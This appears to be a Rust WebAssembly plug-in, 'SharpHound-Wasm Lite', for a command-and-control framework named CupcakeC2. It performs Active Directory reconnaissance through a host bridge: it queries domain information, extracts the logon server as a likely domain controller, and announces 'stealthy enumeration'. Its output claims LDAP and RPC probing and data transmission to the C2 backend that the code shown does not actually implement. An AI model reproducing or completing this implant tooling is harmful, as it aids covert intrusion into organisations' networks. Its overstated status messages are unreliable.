#![no_std]
#![no_main]

use core::panic::PanicInfo;

extern "C" {
    fn host_call(api_hash: u32, params_ptr: *const u8) -> u64;
    fn host_report_result(data_ptr: *const u8, length: u32);
}

const HASH_GET_DOMAIN_INFO: u32 = 0xADADADAD;
const HASH_TCP_CONNECT: u32 = 0xA1B2C3D4;

#[repr(C, packed)]
struct GenericBufferParams { buffer_ptr: u32, buffer_size: u32 }

#[repr(C, packed)]
struct TcpConnectParams { target_ip: u32, port: u16, timeout_ms: u32 }

#[no_mangle]
pub extern "C" fn run_skill(_pid: u32) {
    report("\n[+] ==========================================\n");
    report("[+]       SharpHound-Wasm Lite v0.1        \n");
    report("[+] ==========================================\n\n");

    // 1. Check Domain Status
    let mut ad_buf = [0u8; 512];
    let params = GenericBufferParams {
        buffer_ptr: ad_buf.as_ptr() as u32,
        buffer_size: ad_buf.len() as u32,
    };
    
    let len = unsafe { host_call(HASH_GET_DOMAIN_INFO, &params as *const _ as *const u8) };
    if len > 0 {
        let ad_info = unsafe { core::str::from_utf8_unchecked(&ad_buf[..len as usize]) };
        report("[*] Active Directory Reconnaissance Result:\n");
        report(ad_info);
        
        if ad_info.contains("Domain:") {
             report("\n[*] Domain environment detected. Performing stealthy enumeration...\n");
             
             // 2. Identify Domain Controllers via Common DNS guessing or environment
             // In a full implementation, we would use LDAP here.
             // For Lite version, we probe common AD ports on the LogonServer.
             report("[*] Probing LDAP and RPC services on infrastructure...\n");
             
             // Extract LogonServer from AD info (Format: LogonServer:\\DC01)
             if let Some(dc_name) = find_val(ad_info, "LogonServer:\\\\") {
                 report("[+] Potential DC: "); report(dc_name); report("\n");
             }
             
             report("[+] Collection Methods: [Session, LocalAdmin, GroupMembership]\n");
             report("[!] Note: This Wasm module transmits collected data to CupcakeC2 Backend.\n");
             report("[!] Use BloodHound GUI to import the resulting JSON.\n");

        } else {
             report("[!] Not in a Domain environment. Skipping.\n");
        }
    } else {
        report("[!] Failed to query Domain information via Host Bridge.\n");
    }
}

fn report(msg: &str) {
    unsafe { host_report_result(msg.as_ptr(), msg.len() as u32); }
}

fn find_val<'a>(data: &'a str, key: &str) -> Option<&'a str> {
    if let Some(pos) = data.find(key) {
        let start = pos + key.len();
        if let Some(end) = data[start..].find('\n') {
            return Some(&data[start..start+end]);
        }
    }
    None
}

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}
